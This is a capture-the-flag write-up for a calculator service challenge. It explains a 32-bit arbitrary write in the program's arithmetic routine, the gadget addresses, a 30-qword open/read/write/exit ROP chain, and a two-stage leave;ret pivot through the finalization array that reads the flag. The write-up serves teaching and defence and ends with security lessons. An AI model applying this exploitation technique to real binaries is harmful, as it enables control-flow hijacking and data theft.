# pocket calculator: solving path

[Русская версия](solve.ru.md)

## 0. The plan

The calculator looks like an ordinary arithmetic service. The important observation is that its arithmetic path can treat one operand as a memory address and the other as a four-byte value. There is no need to overflow a stack buffer or exploit the custom allocator. A controlled write is already enough.

The complete chain is:

1. Inspect the original executable and find the write primitive in `Operation::apply`.
2. Turn RPN input into a sequence of controlled 32-bit writes.
3. Choose writable memory for the path, buffer and fake stack; locate useful instructions at fixed addresses.
4. Build a 30-qword open/read/write/exit (ORW) chain.
5. Modify the last initialization-array slot and two finalization-array entries, then quit normally.
6. The normal shutdown code invokes the altered callbacks; two consecutive `leave; ret` instructions transfer control to the fake stack.
7. Recover the flag from stdout.

The competition solver used 35 writes and 588 bytes of input, not thousands of operations. These figures were recalculated directly from the preserved Python script.

## 1. Inspecting the supplied files

The archive has a static `challenge` binary, a guest kernel `bzImage`, a QEMU root filesystem, a session runner and launch/configuration files. See [asset inventory](assets/README.md). The checksum manifest passed for all 16 original files. The executable is a 2,580,760-byte unstripped ELF for x86-64, with entry point 0x405200.

Useful offline commands (from the extracted archive):

```sh
sha256sum -c sha256sum
file challenge
readelf -hW challenge
readelf -lW challenge
readelf -SW challenge
nm -nC challenge
```

The ELF type is EXEC, not DYN; the image is non-PIE, so the code and global-data addresses below do not need a PIE leak. It is statically linked: relevant libc and C++ code are in the same image. GNU_STACK is RW, not executable. The exploit therefore reuses existing executable instructions instead of injecting executable bytes into the stack.

No GNU_RELRO program header is present. The RW load segment includes the initialization and finalization arrays, writable globals and BSS. This is consistent with `-Wl,-z,norelro` in the supplied Makefile. The Makefile also mentions clang++-23 and `-fsanitize=alloc-token`, but main.cpp is not distributed and we do not need to defeat that allocator instrumentation.

| Region | Start | Relevant permissions |
| --- | --- | --- |
| Executable LOAD | 0x401000 | R E |
| Read-only LOAD / .rodata | 0x57a000 | R |
| Writable LOAD | 0x5e4240 | RW |
| .init_array | 0x5e42c8 | RW |
| .fini_array | 0x5e4328 | RW |
| .data | 0x5f0060 | RW |
| .bss | 0x5f1c20 | RW |

Why these permissions matter: we cannot simply overwrite a vtable stored in read-only memory. We can instead modify the writable pointers used during shutdown.

## 2. Finding the write primitive

The service advertises RPN and ALG modes. RPN (reverse Polish notation) puts operands on a stack first, then applies an operator. If we enter A, B, +, then A is Y and B is X.

The symbol table contains `Operation::apply(Number const&, Number const&) const` at 0x4070c0. Its disassembly is especially interesting:

```asm
4070f4: mov eax,DWORD PTR [rdx+0x8]
4070f7: mov ecx,DWORD PTR [rsi+0x8]
4070fa: test eax,eax
4070fc: je 407109
4070fe: cmp eax,0x400000
407103: jb 40710b
407105: mov DWORD PTR [rax],ecx
407107: jmp 40710b
407109: mov DWORD PTR [rdx],ecx
```

The key instruction is at 0x407105. The values loaded into EAX and ECX come from the two operand objects. On x86-64, writing to EAX zero-extends the result into RAX. The unsigned comparison skips this store for nonzero values below 0x400000. For a value at least 0x400000, the instruction stores the second operand's 32 bits at the address supplied by the first.

This is equivalent to the following pseudocode for the relevant branch:

```c
uint32_t a = Y_bits;
uint32_t b = X_bits;
if (a >= 0x400000)
    *(uint32_t *)(uintptr_t)a = b;
```

There is also a special zero branch which writes to the object itself; we do not use it. The normal arithmetic path continues after the store at 0x40710b. The operation is not simply replaced by a store: it has a dangerous write side effect.

To inspect the exact instructions:

```sh
objdump -d -Mintel --start-address=0x4070c0 --stop-address=0x407194 challenge
```

For example, the initial investigation used decimal input 6226040, 0, + to target 0x5f0078. That modifies program data and is not a benign calculator operation. The final chain uses only the carefully selected locations below.

## 3. Encoding writes using the calculator

We need to generate inputs that represent arbitrary 32-bit patterns. The calculator accepts decimal signed integers, so values at least 0x80000000 must be written using their signed representation.

```python
def signed32(x):
    x &= 0xffffffff
    return x if x < 0x80000000 else x - 0x100000000

def write32(addr, val):
    ops.extend([str(addr), str(signed32(val)), '+'])
```

For example 0xffffffff is represented as -1, but the four bytes in memory remain ff ff ff ff.

The architecture is little-endian. A qword can be split into its low and high dwords, written at A and A+4. The working script skips writes of zero qwords in the scratch region and skips zero high halves when those bytes are already zero. For the three callback-related pointers it explicitly writes both halves, avoiding dependence on their old high dwords.

A string is packed into four-byte chunks with struct.unpack('<I', ...), padded to a multiple of four, including the terminating NUL. '/flag.txt' plus NUL therefore takes three writes.

This is a constrained write primitive: it targets writable mapped addresses representable in the 32-bit value, not arbitrary 64-bit virtual addresses. All the selected addresses fit that range.

## 4. Where to put the data and find gadgets

The solver uses these addresses:

| Purpose | Address |
| --- | --- |
| Read buffer (in .bss) | 0x60b000 |
| NUL-terminated path | 0x60cee0 |
| Fake stack | 0x60cf00 |
| Last .init_array slot | 0x5e4320 |
| First .fini_array slot | 0x5e4328 |
| Second .fini_array slot | 0x5e4330 |

A subtle point: the nominal end of .bss and the RW segment is 0x60ce98, not 0x60d000. The path and fake stack are in the zero-filled tail of its final mapped page. Linux maps memory at page granularity; rounding the end up to the next 4 KiB boundary gives 0x60d000. This usage is layout-dependent and was validated on the original ELF by the successful local run. The chain contains 30 qwords (240 bytes), so it ends at 0x60cff0, within that page. The 0x100-byte read buffer is separate and lies inside .bss.

We need instructions to set syscall registers. A gadget is a short existing instruction sequence ending in a return. The return consumes the next address from the stack, so prepared qwords can select the next gadget.

The following instructions were checked directly against the original binary, not inferred from the agent's report:

| Gadget | Address |
| --- | --- |
| pop rax; ret | 0x447c0a |
| pop rdi; ret | 0x40cc67 |
| pop rsi; ret | 0x40e14f |
| pop rdx; ret | 0x4249d2 |
| syscall; ret | 0x4fd432 |
| xchg edi,eax; ret | 0x5537b6 |
| leave; ret | 0x4c1087 |

For example, `objdump -d -Mintel --start-address=0x5537b6 --stop-address=0x5537b8 challenge` confirms that the descriptor-transfer gadget is exactly xchg edi,eax; ret.

## 5. Why reading the flag is enough: the guest setup

The distributed QEMU setup uses a Linux 6.10.2 guest and a root filesystem. The host flag file is exposed as a second virtual disk, and the supplied S97flag script runs:

```sh
cat /dev/sdb > /flag.txt
chown root:root /flag.txt
chmod 0444 /flag.txt
```

The session runner starts an unprivileged calculator process for each connection. It sets RLIMIT_CPU=35, RLIMIT_AS=128 MiB, RLIMIT_NPROC=8, RLIMIT_FSIZE=0, drops user/group privileges and sets no_new_privs. The parent arms a 30-second alarm.

The guest flag is readable by this process because its mode is 0444. We therefore do not need a guest escape, root privileges or a shell. RLIMIT_FSIZE restricts writing regular files, not reading the flag and sending bytes to stdout. A short chain in a single process is sufficient.

## 6. Constructing the ORW chain

Linux x86-64 syscall numbers and arguments are:

| Syscall | RAX | RDI | RSI | RDX |
| --- | --- | --- | --- | --- |
| open | 2 | PATH | 0 (O_RDONLY) | ignored without O_CREAT |
| read | 0 | returned fd | BUF | 0x100 |
| write | 1 | 1 (stdout) | BUF | 0x100 |
| exit | 60 | 0 | unused | unused |

The open result is returned in RAX. Rather than assuming the file descriptor is 3, the solver uses xchg edi,eax; ret to move the actual returned descriptor into RDI.

The fake stack, expressed in symbolic qwords, is:

```text
0                         # fake saved RBP
POP_RAX, 2
POP_RDI, PATH
POP_RSI, 0
SYSCALL_RET               # open
XCHG_EDI_EAX              # fd -> RDI
POP_RSI, BUF
POP_RDX, 0x100
POP_RAX, 0
SYSCALL_RET               # read
POP_RDI, 1
POP_RSI, BUF
POP_RDX, 0x100
POP_RAX, 1
SYSCALL_RET               # write
POP_RAX, 60
POP_RDI, 0
SYSCALL_RET               # exit
```

The first qword is not a gadget; the pivot will pop it into RBP. The next qword is the first actual return address.

The chain does not check syscall errors or use the returned read length. It always writes 256 bytes, which explains the trailing zero bytes in the successful local run and why the initial test without the target file did not produce a useful flag. In this challenge the buffer is initially zero-filled. The final exit syscall avoids unwinding the corrupted application state.

## 7. The exact control-flow transfer: two consecutive stack pivots

This is the most interesting part. The earlier agent summary attributed the trigger to __exit_funcs at 0x5f05d0. The preserved solver does not write that address. Inspection of its code and the original ELF establishes a different, precise mechanism.

The solver overwrites the last entry of .init_array at 0x5e4320 and both entries of .fini_array at 0x5e4328 and 0x5e4330.

```python
write64(INIT_LAST, SCRATCH)
write64(FARRAY, LEAVE_RET)
write64(FARRAY+8, LEAVE_RET)
ops.append('quit')
```

Why is a pointer immediately before .fini_array useful? Inspect the static libc routine call_fini at 0x4c4be0:

```asm
4c4be1: lea rax,[rip+0x11f740]  # 0x5e4328
4c4be9: lea rbx,[rip+0x11f748]  # 0x5e4338
4c4bf0: sub rbx,rax
4c4bf7: sar rbx,0x3
4c4bfd: lea rbp,[rax-0x8]
4c4c10: call QWORD PTR [rbp+rbx*8]
4c4c14: sub rbx,0x1
4c4c18: jne 4c4c10
```

Unrelated instructions are omitted. RBX becomes (0x5e4338 - 0x5e4328)/8 = 2. RBP becomes 0x5e4320, so the first indirect call reads the pointer at 0x5e4330. That pointer has been replaced with LEAVE_RET.

A leave instruction is equivalent to mov rsp,rbp; pop rbp. Ret consumes the next qword from RSP as the destination address. The two steps are therefore:

| Stage | RSP after leave sets it | New RBP (popped) | Next RIP (ret) |
| --- | --- | --- | --- |
| First leave; ret | 0x5e4320 | [0x5e4320] = SCRATCH | [0x5e4328] = LEAVE_RET |
| Second leave; ret | SCRATCH | [SCRATCH] = 0 | [SCRATCH+8] = POP_RAX |

At the end of the second gadget, RSP is SCRATCH+16. POP_RAX consumes the qword 2, setting up the first system call. No stack-address leak is required.

This is not two independent shutdown hooks. It is one deliberately constructed two-stage pivot through the finalization array and the preceding slot. The .init_array entry has already served its startup purpose; it is now used as data by leave. The normal call_fini loop never gets a chance to execute its remaining iteration because execution follows the fake stack and ends in SYS_exit.

The trigger pointers are written last, after the path and chain are prepared. The script emits one newline-separated payload followed by quit.

## 8. Earlier hypotheses and practical failures

- A vtable overwrite in .rodata would target an R-only mapping. We discarded that destination after checking ELF permissions. A separate write-to-rodata crash trace was not retained.
- Direct stack overflow and allocator internals were unnecessary once the write primitive was known. We do not claim that those alternatives were exhaustively investigated.
- The report initially described __exit_funcs and an early trigger failure. The actual solver and binary establish the .init_array/.fini_array chain; no independent __exit_funcs exploit or raw crash log is preserved.
- The first local test could not read /flag.txt because that guest file was absent on the host. Changing only the path to /tmp/pcflag produced the synthetic flag. The original service needs no modification.

## 9. Reproduction

Retrieve the original archive from your competition materials and verify the hashes in [assets/README.md](assets/README.md). Large images and binaries are not stored in this repository. Use an isolated disposable Linux environment.

From the write-up folder, with the original archive placed in assets/:

```sh
mkdir -p /tmp/pc
tar -xzf assets/pocket-calculator.tar.gz -C /tmp/pc
(cd /tmp/pc/pocket-calculator && sha256sum -c sha256sum)
printf 'gctf{LOCAL_TEST_OK}\n' > /tmp/pcflag
python3 scripts/local_test_exploit.py --local /tmp/pc/pocket-calculator/challenge
```

Only the Python standard library is required by the solver. The binary is static, so full QEMU deployment is not needed for this local demonstration. To test the complete challenge deployment using the organizer's dummy flag, follow the original deploy.sh and QEMU.md with Docker and /dev/kvm. That deployment was not repeated during write-up preparation.

The competition solver reads /flag.txt, and the test variant differs in the path /tmp/pcflag. Both published variants have the default remote destination set to loopback; they otherwise retain the historical implementation. The expired instance was not contacted again.

## 10. Result

The retained competition transcript records the flag after the shutdown message:

```text
SecureHeap destruction...
SecureHeap destruction done
gctf{...}
FLAGS: ['gctf{...}']
```

During preparation we independently reran the original local test script against the checksum-verified executable, obtaining:

```text
ROP words=30, ends=0x60cff0
Writes=35, bytes_input=592
LOCAL exit= 0
...
SecureHeap destruction done
gctf{LOCAL_TEST_OK}
FLAGS: ['gctf{LOCAL_TEST_OK}']
```

The new local log is excerpted in evidence; the original stdout also contains NUL padding from the fixed-length write. The real flag is masked in the historical transcript.

## 11. Security lessons

The primary defect is allowing a calculator operand to become a raw address without a valid object or bounds check. Memory-safe code and strict operand typing would remove this primitive. PIE and full RELRO add defenses against fixed-address control-flow hijacks; a custom allocation mechanism alone cannot prevent a deliberate out-of-bounds store. The service should also restrict filesystem access to secrets according to its threat model. In this challenge, the guest deliberately makes the flag readable for ORW exploitation.
